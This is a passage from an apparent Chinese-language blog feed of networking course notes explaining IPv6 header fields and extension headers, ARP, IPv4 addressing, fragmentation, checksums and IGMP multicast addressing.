title="基本首部各字段含义："></a>基本首部各字段含义：</h5><ul><li>版本:4位，指明了协议的版本，对IPv6该字段总是6。</li><li>区分服务:8位，以前叫做通信流类别，6表示IPv6数据包的类或优先级。类似于IPv4的服务类型字段。</li><li>流标号:20位，流是互联网络上从特定源点到特定终点的一系列数据报。数据流由流标号和源节点的地址唯一标识。所有属于同一个流的数据报都具有同样的流标号、源lP地址和目的IP地址</li><li>有效载荷长度:16位，指明IPv6数据报除基本首部以外的字节数（所有扩展首部都算在有效载荷之内），其最大值是64KB。如果使用逐跳选项扩展头的特大净荷选项，就能传送更大的数据包，此时有效载荷长度置0</li><li>下一个首部:8位，如果IPv6数据报没有扩展首部，它相当于IPv4的协议字段;如果IPv6数据报有扩展首部，它指出第一个扩展首部的类型</li><li>跳数限制:8位，与IPv4的TTL类似。源节点在数据报发出时即设定跳数限制。路由器在转发数据报时将跳数限制字段中的值减1。当跳数限制的值为零时，将此数据报丢弃</li><li>源地址:128位，定义了源主机的IP地址</li><li>目的地址:128位，定义了目的主机的IP地址。如果出现路由头，这个地址不是最终的接收数据包的主机的IPv6地址，而是路由报头列表中的第一个路由器地址</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6数据结构与IPv4的对比.png" style="zoom: 50%;" /><h4 id="IPv6拓展首部："><a href="#IPv6拓展首部：" class="headerlink" title="IPv6拓展首部："></a>IPv6拓展首部：</h4><ul><li>它代替了IPv4报头及其选项，增强了IPv6的功能，使其可以支持未来的需求</li><li>扩展首部留给路径两端的源站和目的站主机来处理，中间路由器都不处理扩展首部（除路由选择和逐跳选项扩展首部)，大大提高了路由器的处理效率</li><li>lPv6数据包中可以包含零个或多个具有不同的长度扩展报头。IPv6报头中的下一个报头字段，指向第一个扩展报头。每个扩展报头中，都包含下一个报头字段，指向下一个扩展报头。最后一个扩展报头指出上层协议数据单元的类型，上层协议可以是TCP协议、UDP协议或者ICMPv6协议等。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/无扩展首部.png" style="zoom:80%;" /><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/有扩展首部.png" style="zoom: 67%;" /><h5 id="六种扩展首部："><a href="#六种扩展首部：" class="headerlink" title="六种扩展首部："></a>六种扩展首部：</h5><p><strong>逐跳选项扩展首部</strong>(Hop-by-Hop Options Header)，<strong>路由选择扩展首部</strong>(Routing Header)，<strong>分片扩展首部</strong>(Fragment Header)，<strong>认证扩展首部</strong>(Authentication Header)，<strong>目的站选项扩展首部</strong>(Destination Header)和封装<strong>安全有效载荷扩展首部</strong>(Encapsulated Security Payload Header)</p><blockquote><p style="color:blue;">注:每个扩展首部的长度应为8个字节的整数倍，是为了满足扩展首部对齐的要求</p></blockquote><h5 id="逐跳选项扩展首部"><a href="#逐跳选项扩展首部" class="headerlink" title="逐跳选项扩展首部"></a>逐跳选项扩展首部</h5><ul><li>逐跳选项扩展首部中最实质的是逐跳选项字段的内容，该字段描述了数据分组转发的特性。从源节点到目的节点的路由上的每个节点，即每个转发包(数据报)的路由器都检查逐跳选项中的信息</li><li>由于它需要每个中间路由器进行处理，所以只在绝对必要的时候才会出现</li><li>必须紧跟在IPv6基本首部后，若存在逐跳选择首部，基本首部中下一个首部字段值为0</li></ul><p><strong>逐跳选项：</strong></p><ul><li>巨型净荷选项:净荷超过65535字节</li><li>路由器警告选项:用于多播侦听发现和资源存储协议</li></ul><blockquote><p>RFC2460中已经将这两个选项废弃。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/逐跳扩展首部结构.png"  /><h5 id="路由选择扩展首部"><a href="#路由选择扩展首部" class="headerlink" title="路由选择扩展首部"></a>路由选择扩展首部</h5><p>路由选择扩展首部代替了IPv4中所实现的源选路。源选路允许用户指定数据报的路径，即到达目的地沿途必须经过的路由器<br>·前一个首部中的<code>下一个首部</code>的<strong>字段值为43</strong></p><blockquote><p>RFC2460中定义了一种类型，即类型0，只有列表中的路由器才处理路由选择扩展首部，其它路由器不必处理</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/路由选择扩展首部.png" style="zoom: 80%;" /><p><strong>路由选择扩展操作过程</strong></p><ul><li>源节点构造数据报必须经过的路由器列表，构造类型0选路首部（路由器列表、最终目的地址、剩余段数)</li><li>IPv6基本首部的目的地址是路由器列表中的第一个路由器地址,而不是包的最终目的地址。最终目的地址是路由选择扩展首部数据字段的最后一个地址</li><li>在地址列表中的节点接收到该包之后，对IPv6基本首部和路由选择扩展首部进行处理:<ul><li>剩余段数为0，则此路由器节点是该包的最终目的地址</li><li>若此节点不是该包的最终目的地址，将它自己的地址从IPv6首部目的地址字段取出，用路由选择列表中的下一个节点地址代替，同时将剩余段数字段值减1，并把包发送到下一个节点</li><li>重复此过程，直到包到达其最终目的地址。</li></ul></li></ul><h5 id="分段扩展首部"><a href="#分段扩展首部" class="headerlink" title="分段扩展首部"></a>分段扩展首部</h5><blockquote><p style="color:blue;">当源节点发送的IPv6数据报比到达目的节点所经过路径上的最小MTU(PMTU)还要大时，需要对这个数据报进行分段</p></blockquote><p>IPv6协议通过分段扩展首部实现数据报的分段，只允许源节点对数据报进行分段，简化了中间节点对数据报的处理<br>前一个首部中的<code>下一个首部</code>的<strong>字段值为44</strong>。<br>需要进行分段的原始数据报在源节点被分为一系列分段数据报发送出去，每个分段数据报的大小应与传输路径上的最小MTU适应</p><blockquote><p>RFC2460中规定最小MTU值为1280字节</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/分段扩展首部.png"  /><blockquote><p style="color:blue;">对于IPv6固定首部和传输过程中必须由路由器处理的扩展首部如路由选择、逐跳选项扩展首部，不允许分段</p></blockquote><ul><li><p>可分段的部分包括:<strong>载荷、只能在到达最终目的地址时才处理的扩展首部</strong>。</p></li><li><p>将原始数据报中的可分段部分从左到右分成若干片，除最后一个分段外，每一片的长度是8个的整数倍。</p></li><li><p><strong>每个分段单独封装为一个IPv6数据报。</strong></p></li></ul><h5 id="身份认证扩展首部"><a href="#身份认证扩展首部" class="headerlink" title="身份认证扩展首部"></a>身份认证扩展首部</h5><blockquote><p style="color:orange;">为IPv6数据包和IPv6报头中那些经过IPv6网络传输后值不会改变的字段，提供了数据验证、数据完整性和反重放保护</p></blockquote><p>前一个首部中的<code>下一个首部</code>的<strong>字段值为51</strong></p><h5 id="封装安全有效载荷扩展首部"><a href="#封装安全有效载荷扩展首部" class="headerlink" title="封装安全有效载荷扩展首部"></a>封装安全有效载荷扩展首部</h5><ul><li>封装安全有效载荷（ESP）报头和尾部提供了数据机密性、数据验证性、数据完整性，以及对已封装有效载荷的重放保护服务。ESP报头并不为出现在它之前的IPv6报头或扩展报头提供安全服务</li><li>前一个首部中的<code>下一个首部</code>的<strong>字段值为50</strong></li></ul><h5 id="目的站选项扩展首部"><a href="#目的站选项扩展首部" class="headerlink" title="目的站选项扩展首部"></a>目的站选项扩展首部</h5><ul><li><strong>目的站选项扩展首部</strong>携带只需要目的站点检验的可选信息，IPv6目的地址字段所列的第一个目的主机，以及路由选择扩展首部所列的后续目的主机都要处理这个可选信息</li><li>前一个首部中的<code>下一个首部</code>的<strong>字段值为60</strong></li><li>以下两种方式使用目的选项头:<ul><li><strong>如果存在路由报头，则目的选项报头指定了在每个中间目标都要转发或处理的选项，此时目的选项头出现在路由报头之前</strong></li><li><strong>如果不存在路由报头，或者目的选项头出现在路由头之后，则目的选项报头中指定了在最终目标处要转发或处理的洗项</strong></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;网络协议分析-IPv6协议部分&quot;&gt;&lt;a href=&quot;#网络协议分析-IPv6协议部分&quot; class=&quot;headerlink&quot; title=&quot;网络协议分析    IPv6协议部分&quot;&gt;&lt;/a&gt;网络协议分析    IPv6协议部分&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>IPv4部分协议信息汇总</title>
    <link href="https://shierjinghuang.github.io/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/"/>
    <id>https://shierjinghuang.github.io/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/</id>
    <published>2022-12-15T14:13:23.000Z</published>
    <updated>2022-12-16T05:51:50.712Z</updated>
    
    <content type="html"><![CDATA[<h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a>地址解析协议 ARP</h2><p>[TOC]</p><h3 id="ARP的定义与基本功能"><a href="#ARP的定义与基本功能" class="headerlink" title="ARP的定义与基本功能"></a>ARP的定义与基本功能</h3><ul><li><p>掌握ARP协议的报文格式</p></li><li><p>掌握ARP协议的工作原理</p></li><li><p>理解ARP高速缓存的作用</p></li><li><p>掌握ARP缓存表的维护过程</p></li></ul><p><strong>ARP</strong>(Address Resolution Protocol，RFC 826）是根据IP地址获取物理地址的一个TCP/IP协议。主机通过将ARP请求<strong>广播</strong>到网络上的所有主机并接收返回消息来确定目标IP地址的物理地址，同时将IP地址和硬件地址存入本机ARP缓存中，下次请求时直接查询<strong>ARP缓存</strong>。</p><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>物理地址通常是由硬件来实现的，例如以太网的物理地址被写入到网卡中，任何一块网卡的物理地址是唯一的</p><blockquote><p style="color:blue;">物理地址的长度和格式取决于具体的网络，以太网的物理地址是6字节地址物理地址可以是单播地址、多播地址或广播地址。</p></blockquote><h4 id="逻辑地址："><a href="#逻辑地址：" class="headerlink" title="逻辑地址："></a>逻辑地址：</h4><p>逻辑地址与物理设备本身没有关联, 逻辑地址可以是单播地址、多播地址和广播地址。</p><blockquote><p style="color:skyblue;">目前Internet上的IPv4协议逻辑地址是32位的IP地址， IPv6地址有128位长</blockquote><h4 id="地址解析"><a href="#地址解析" class="headerlink" title="地址解析:"></a>地址解析:</h4><p>逻辑地址是在网络层使用的，但数据包是在物理网络传递。主机或路由器是通过物理地址来识别的,因此将一个数据包传递到一个主机或路由器要进行寻址，需要将一个逻辑地址映射到相应的物理地址。</p><blockquote><p style="color:blue;">地址解析就是主机在发送帧前将目的逻辑地址转换成目的物理地址的过程。</p></blockquote><h5 id="静态映射"><a href="#静态映射" class="headerlink" title="静态映射:"></a>静态映射:</h5><p>手工创建IP地址与物理地址的映射关系，建立映射表。当已知IP地址时，通过查找映射表得到对应的物理地址。</p><blockquote><p style="color:orange;">局限性: 主机更换了网卡，也就改变了主机的物理地址。当主机从一个网络移到另一个网络时，物理地址没变，但IP地址改变了。·要适应这些变化，会增大维护静态映射表的开销。</p></blockquote><h5 id="用协议实现地址映射："><a href="#用协议实现地址映射：" class="headerlink" title="用协议实现地址映射："></a>用协议实现地址映射：</h5><p>在使用TCP/IP协议的以太网中，<strong>ARP</strong>(Address Resolution Protocol)协议完成将IP地址映射到MAC地址的过程，逆地址解析协议<strong>RARP</strong>(Reverse Address Resolution Protocol)将物理地址映射为IP地址</p><h3 id="ARP的报文格式："><a href="#ARP的报文格式：" class="headerlink" title="ARP的报文格式："></a>ARP的报文格式：</h3><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/ARP的报文格式.png"  /><p style="color:blue; text-indent: 112px;">硬件类型:16bit，定义运行ARP的网络类型，如以太网的硬件类型是1。</p><p style="color:blue; text-indent: 112px;">协议类型:16bit，定义使用ARP的高层协议，如对于IPv4协议，该字段的值是Ox0800。</p><p style="color:blue; text-indent: 112px;">硬件长度:8bit，以字节为单位的物理地址长度，如以太网硬件地址长度为6。</p><p style="color:blue; text-indent: 112px;">协议长度:8bit，以字节为单位的逻辑地址的长度，对于IPv4，该字段为4。<p><p style="color:blue; text-indent: 112px;">操作码:16bit,1表示ARP请求，2表示ARP应答。</p><p style="color:blue; text-indent: 112px;">发送端硬件地址:变长字段，对于以太网该字段长度是6字节</p><p style="color:blue; text-indent: 112px;">发送端逻辑地址:变长字段，对于IPv4地址，该字段长度为4字节。</p><p style="color:rgb(255, 118, 0); text-indent: 112px;">目的端硬件地址:变长字段，对于ARP请求报文，该字段全为0</p><p style="color:blue; text-indent: 112px;">目的端逻辑地址:变长字段，定义目标逻辑地址。</p><p style="color:black;">ARP数据报直接封装在数据链路层的帧中</p><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/ARP封装.png" style="zoom:80%;" /></center><h3 id="ARP的运行过程："><a href="#ARP的运行过程：" class="headerlink" title="ARP的运行过程："></a>ARP的运行过程：</h3><h4 id="数据包传输步骤"><a href="#数据包传输步骤" class="headerlink" title="数据包传输步骤"></a>数据包传输步骤</h4><blockquote><ul><li>发送端知道目的端的IP地址。</li><li>IP要求ARP创建一个ARP请求报文，其中包含了发送方的物理地址、发送方的IP地址和目的端的IP地址。目的端的物理地址用0填充</li><li>将报文传递到数据链路层，并在该层中用<strong>发送方的物理地址作为源地址</strong>，<strong>用物理广播地址作为目的地址</strong>，将其封装在一个帧中。</li><li>因为该帧中包含了一个<strong>广播</strong>目的地址，所以同一链路中的每个主机或路由器都接收到这个帧。所有接收到该帧的主机都将其传递到ARP层进行处理。<strong>除了目的端主机以外的所有主机都丢弃该报文</strong>。</li><li>目的主机用一个包含其物理地址的ARP应答报文<strong>单播</strong>做响应。</li><li>发送方接收到这个应答报文，这样它就知道了目标主机的物理地址。</li><li>将IP数据报封装在一个帧中，并单播到目的地址。</li></ul></blockquote><h3 id="ARP高速缓存："><a href="#ARP高速缓存：" class="headerlink" title="ARP高速缓存："></a>ARP高速缓存：</h3><p>当主机A通过ARP请求得到B的物理地址后就将“IP地址—MAC地址”的绑定信息存储在<strong>高速缓存</strong>中。对于后续发往E的分组，可以通过缓存得到物理地址<br>当ARP被询问一个已知IP地址节点的MAC地址时，先在ARP缓存表查看，若存在，就直接返回MAC地址，若不存在，才发送ARP请求向局域网查询。</p><h4 id="缓存表内容："><a href="#缓存表内容：" class="headerlink" title="缓存表内容："></a>缓存表内容：</h4><p>静态项目一直保留在缓存中，直到重新启动计算机为止。</p><p>动态项目随时间推移自动添加和删除，每个动态ARP缓存项的潜在生命周期是10分钟。<br>新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除;<br>如果某个项目已在使用，则又收到2分钟的生命周期;<br>如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h4 id="arp命令的用法"><a href="#arp命令的用法" class="headerlink" title="arp命令的用法:"></a>arp命令的用法:</h4><p>arp命令用于对本地arp缓存进行操作，不会发送ARP请求</p><blockquote><ul><li>arp -a:              列出ARP缓存中的所有条目</li><li>arp -a ip:          列出缓存中与ip对应的条目</li><li>arp -d:              清空arp缓存</li><li>arp -d ip:          删除缓存中与ip对应的条目</li><li>arp -s ip mac : 在arp缓存中添加一个静态arp条目</li></ul></blockquote><h2 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h2><h3 id="IP协议简介（lP-Internet-Protocol）"><a href="#IP协议简介（lP-Internet-Protocol）" class="headerlink" title="IP协议简介（lP- Internet Protocol）"></a>IP协议简介（lP- Internet Protocol）</h3><ul><li>网际协议IP是TCP/IP最核心的协议，也是最重要的因特网标准协议之一</li><li>IP负责将数据包从源点交付到终点，所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。</li></ul><h4 id="IP的特性："><a href="#IP的特性：" class="headerlink" title="IP的特性："></a>IP的特性：</h4><blockquote><p style="color:blue;">不可靠:不保证分组成功地送到目的站。任何可靠性的要求必须由上层协议实现。</p></blockquote><blockquote><p style="color:orange;">无连接:IP并不维护任何后续分组的状态信息，每个分组都是相互独立的</p></blockquote><blockquote><p style="color:red;">尽最大努力交付:IP协议尽力发送每个分组，只有当资源用完或网络出现故障时才会发送失败</p></blockquote><h4 id="IP地址及表示方法："><a href="#IP地址及表示方法：" class="headerlink" title="IP地址及表示方法："></a>IP地址及表示方法：</h4><p>IP地址：一个IP地址惟一地标识了Internet上的一台主机，IPv4协议使用32位地址，这表示地址空间是2^32。而IPv6协议使用128位地址，地址空间为2^128。<br>表示方法：点分十进制表示:每个字节用一个十进制数表示。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/IP地址分类.png"/><h5 id="网络号："><a href="#网络号：" class="headerlink" title="网络号："></a>网络号：</h5><p>D类地址和E类地址不划分网络号和主机号。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/网络号.png" style="zoom:67%;" /><h5 id="特殊的IP地址："><a href="#特殊的IP地址：" class="headerlink" title="特殊的IP地址："></a>特殊的IP地址：</h5><blockquote><p style="color:blue;">网络地址:主机号全0的IP地址，不分配给任何主机，作为网络本身的标识</p></blockquote><blockquote><p style="color:orange;">广播地址:主机号为全1的IP地址，用作广播地址，目的地址为广播地址的数据包传递给该网络中的所有节点</p></blockquote><blockquote><p style="color:skyblue;">有限广播地址:32位为全“1”的IP地址(255.255.255.255)，通常由无盘工作站启动时使用，希望从网络IP地址服务器处获得一个IP地址</p></blockquote><blockquote><p style="color:red;">主机本身地址:32位全“0”的IP地址(0.0.0.0)称为主机本身地址</p>- 当一个主机要获得其IP地址时，可以运行一个引导程序，并发送一个以全0为源地址、以全1为目的地址的分组给引导服务器，以获得本主机的IP地址。</blockquote><blockquote><p style="color:black;">环回地址:27.0.0.1称为回环地址，可用来测试TCP/IP协议是否正常工作，常用于本机上软件测试和本机上网络应用程序之间的通信地址。</p>- 使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</blockquote><h5 id="专用IP地址："><a href="#专用IP地址：" class="headerlink" title="专用IP地址："></a>专用IP地址：</h5><p>专用lIP地址:仅用于专用网内部的本地主机。<br>大多数路由器不转发携带专用IP地址的数据包，本地主机必须经网络地址转换服务器才能访问Internet。<br>专用IP地址范围: </p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/专用IP地址.png" style="zoom:67%;" /><h4 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h4><p><strong>Subnetting</strong><br>提高IP空间的利用率，增加IP分配的灵活性。<br>从主机号借用若干个比特作为子网号subnet-id，而主机号host-id也就相应减少若干个比特</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><h4 id="子网掩码："><a href="#子网掩码：" class="headerlink" title="子网掩码："></a>子网掩码：</h4><blockquote><p style="color:blue;">子网掩码是一个网络号全1，主机号全0的32位二进制数，用于确定P中有多少位用于子网号。</p>- **~~表示方法~~**：点分十进制，IP地址后用`/`后面写明网络号的位数- 子网掩码与IP地址**按位做与**得到IP地址对应的**网络地址**</blockquote><h3 id="IP数据格式："><a href="#IP数据格式：" class="headerlink" title="IP数据格式："></a>IP数据格式：</h3><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png"></p><p>IP数据报由首部和数据两部分组成</p><h4 id="各字段的含义："><a href="#各字段的含义：" class="headerlink" title="各字段的含义："></a>各字段的含义：</h4><p>版本:4 bit，指IP协议的版本，目前的IP协议版本号为4(即IPv4)</p><p>首部长度:4 bit，以4字节为单位，因此IP的首部长度最大是60字节</p><p>服务类型: 8 bit，区分服务，一般不用。</p><p>总长度: 16 bit，首部和数据之和的长度，单位为字节，因此数据报的最大长度为65535字节。总长度不能超过网络的最大传输单元MTU。</p><p>标识:16 bit，数据报计数器</p><blockquote><p>IP软件在存储器中维持一个计数器，每产生一个数据报，计数器加1，并将此值赋给标识字段。<br>当数据报由于长度超过网络MTU而必须分片时，标识字段的值就被复制到所有的数据报分片的标识字段中。<br>相同的标识字段的值使分片后的各数据报片能正确重组成原来的数据报。</p></blockquote><p>标志: 3 bit，目前只有两位有意义</p><blockquote><ul><li>第一位保留。</li><li>中间一位记为DF，为不分片标志，只有当DF=0时才允许分片。</li><li>最后一位为MF，MF=1表示后面还有分片，MF=O表示这是最后一个数据报片。</li></ul></blockquote><p>偏移量:13 bit，较长的分组被分片后，某分片在原分组中的相对位置。片偏移以8个字节为单位。每个分片的长度必须是8的整数倍。</p><p>生存时间:8 bit，记为TTL (Time To Live)</p><blockquote><ul><li><p>表明数据报在网络中的寿命，其单位为秒。现在TTL的单位是跳数，指明数据报在因特网中至多可经过多少个路由器，最大值为255，通常为32、64、128。</p></li><li><p>当TTL值为1时，表示这个数据报只能在本局域网内传送，因为这个数据报传送到局域网上的某个路由器，在被转发之前TTL值就减小到0，因而会被路由器丢弃。</p></li></ul></blockquote><p>协议: 8 bit，指出此数据报携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给对应的进程处理。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E9%AB%98%E5%B1%82%E5%8D%8F%E8%AE%AE.png"></p><p>首部检验和:16 bit，检验数据报的首部，不包括数据部分。采用简单的16位反码求和的计算方法。</p><p>源IP地址: 32bit，定义了源主机的IP地址。在IP数据包从源主机传送到目的主机期间，该字段保持不变。</p><p>目的IP地址: 32bit，定义了目的主机的IP地址。在IP数据报从源主机传送到目的主机期间，该字段保持不变。</p><h3 id="IP数据报分片："><a href="#IP数据报分片：" class="headerlink" title="IP数据报分片："></a>IP数据报分片：</h3><p>数据包可能经过多个不同的网络，每一个路由器把收到的帧进行拆装，处理后又封装成另一个帧。<br>收到帧的格式与长度取决于这个帧刚经过的物理网络所使用的协发<br>送出去的帧的格式与长度取决于这个帧将要经过的物理网络所使用的协议。</p><p><strong>最大传输单元MTU</strong>：不同网络所能传送的数据包的最大长度是不同的，这个最大长度叫做最大传输单元MTU ( Maximum Transmission Unit ) </p><blockquote><p style="color:orange;">MTU即该网络的数据链路层帧的数据部分的最大长度。</p></blockquote><h4 id="分片："><a href="#分片：" class="headerlink" title="分片："></a>分片：</h4><blockquote><ul><li><p>对于物理网络，如果数据包的长度超过了MTU，就要把数据部分进行分片。</p></li><li><p>每个分片都有自己的首部。</p></li><li><p>如果已经分片的数据包要经过更小MTU的网络，那么这些已经分片的数据包还可再进行分片，数据包在到达最后终点之前可以经过多次的分片。</p></li><li><p style="color:red;">数据包可以被源主机或在其路径上的路由器进行分片，但是数据包的重装只能在目的主机上进行。</p></li></ul></blockquote><h4 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h4><h5 id="目的主机进行分片重组"><a href="#目的主机进行分片重组" class="headerlink" title="目的主机进行分片重组"></a>目的主机进行分片重组</h5><blockquote><p style="color:blue;">IP规定，数据报分片的重组地点是目的主机，中间路由器不对任何被分片的数据报进行重组，即使其转发接口的MTU非常大。</p></blockquote><blockquote><p>优点:<br>简化了路由软件的操作，提高了路由器的处理效率。<br>可以避免重复分片。在数据报投递过程中，途经网络的MTU是不可预知的</p></blockquote><blockquote><p>缺点<br>浪费带宽。因为每个分片都要有一个首部，分片越多，首部开销越大。<br>增加了数据包丢失的可能性。分片越多，丢失的可能性越大。一旦丢失了一个分片，整个数据报就必须重新传输。</p></blockquote><h5 id="分片重组："><a href="#分片重组：" class="headerlink" title="分片重组："></a>分片重组：</h5><p>有关的三个字段是:标识字段、标志字段和偏移量字段。</p><p>当目的主机收到一个数据报时，可以根据偏移量和MF位判断:</p><ul><li>片偏移不为0，表明它是一个分片;</li><li>如果片偏移为0，且MF位为1，表明它是第一个分片;</li><li>如果片偏移为0，且MF位为0，则表明它是一个完整的数据报。</li></ul><p>根据数据报首部“标识”字段的值，可判断哪些分片属于同一个原始数据报片偏移用来确定分片在原始数据报中的位置。</p><h5 id="重组定时器："><a href="#重组定时器：" class="headerlink" title="重组定时器："></a>重组定时器：</h5><p>为防止因等待一个丢失的分片而无限期延长重组过程，在重组分片时启动一个定时器,如果超时后仍然没有收到一个数据报的全部分片，则该数据报被丢弃。<br>IP数据报校验和：</p><blockquote><p style="color:blue;">校验和：数据包上的附加信息，能够识别数据包在传输过程中是否出错。</p></blockquote><p>发送端先计算校验和，并把得到的结果与数据包一起发送出去。接收端对数据包进行同样的计算。若结果正确，则接受这个数据包，否则就丢弃它。</p><h4 id="校验和的计算："><a href="#校验和的计算：" class="headerlink" title="校验和的计算："></a>校验和的计算：</h4><p>发送端：将数据包按16位分段。把这些段用反码算术运算相加，将相加后得到的和再取反码就得出了校验和。<br>接收端：把收到的数据包按16位分段，并把这些段相加。得到的和取反码。若结果为0，则接受这个数据包，否则拒绝这个数据包。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/校验计算.png" style="zoom: 50%;" /><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><blockquote><blockquote><p style="color:blue;">IP数据包的校验和只校验IP首部部分而不校验IP数据部分。</p></blockquote><ul><li>首先，所有将数据封装在IP数据报中的高层协议，都有覆盖整个数据包的校验和。因此，IP数据报的校验和就不必再检验所封装的数据部分。</li><li>其次，每经过一个路由器，IP数据包的首部就要改变一次，但数据部分不改变。因此若校验和包含数据部分，这就意味着路由器要花费很多时间计算没有改变的数据部分的校验和。</li></ul></blockquote><h2 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a>Internet组管理协议IGMP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握IGMP协议的报文格式</span><span class="token comment"># 掌握IGMP协议的工作原理</span><span class="token comment"># 理解多播组地址到以太网地址的映射</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单播与多播与广播"><a href="#单播与多播与广播" class="headerlink" title="单播与多播与广播:"></a>单播与多播与广播:</h3><blockquote><p style="color:red;">单播(unicast):    单个源站与单个目的站之间的通信叫作单播，IP数据报中的源IP地址和目的IP地址分别代表了源站和目的站。</p></blockquote><blockquote><p style="color:blue;">绝大多数的网络应用程序是单播</p></blockquote><blockquote><p style="color:red;">多播/组播(multicast): 一个源站和多个目的站之间的通信叫作多播。</p></blockquote><blockquote><ul><li>IP数据报中的源地址是单播地址，目的地址是组地址(D类地址)</li><li>路由器收到组播数据包后，可从它的多个接口转发出去<br>目前，组播机制没有被广泛支持，主要的组播路由机制有距离向量多播路由协议(DVMRP)和协议无关组播(PIM) .</li></ul></blockquote><blockquote><p style="color:red;">广播(broadcast):广播源站和目的站是一对多的，源站只有一个，但所有其它主机都是目的站Internet不支持广播，因为这会产生非常大的通信量</p></blockquote><h4 id="组播"><a href="#组播" class="headerlink" title="组播:"></a>组播:</h4><p>优点：采用组播技术后，即使用户数量成倍增长，主干网带宽不需要随之增加。从而解决了宽带应用对带宽和服务质量的要求问题</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/组播示意.png" style="zoom: 33%;" /><p>组播比多个单播具有更小的分组时延</p><h5 id="组播地址范围："><a href="#组播地址范围：" class="headerlink" title="组播地址范围："></a>组播地址范围：</h5><blockquote><ol><li>IANA(国际因特网地址分配委员会）把D类地址空间用于IP组播地址</li><li>IP组播地址的范围是:224.0.0.0~239.255.255.255</li><li>常用的组播地址<ul><li>224.0.0.1        在本子网上的所有参加多播的主机和路由器</li><li>224.0.0.2        在本子网上的所有参加多播的路由器</li><li>224.0.0.5        用来给一个网段中所有的OSPF路由器发送OSPF路由信息</li><li>224.0.0.9        RIPv2组地址</li><li>224.0.0.11      供DHCP服务器和中继代理使用</li></ul></li></ol></blockquote><h5 id="动态的组成员"><a href="#动态的组成员" class="headerlink" title="动态的组成员"></a>动态的组成员</h5><blockquote><p style="color:orange;">多播组中的成员是动态的。一个进程可请求其主机参加某个特定组，或在任意时间退出该组</p></blockquote><h5 id="使用硬件进行多播"><a href="#使用硬件进行多播" class="headerlink" title="使用硬件进行多播"></a>使用硬件进行多播</h5><blockquote><p style="color:orange;">当数据报传送到以太网时，以太网利用硬件进行多播，交付给属于该组成员的主机</p></blockquote><h4 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h4><p>多播以太网地址的前25位是0000000100000000010111100这意味着与IP多播相对应的以太网地址范围从01005E000000到01005E7FFFFF。然后将多播IP地址的低23位映射到以太网地址中的低23位。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/多播地址到以太网地址的转换.png" style="zoom: 50%;" 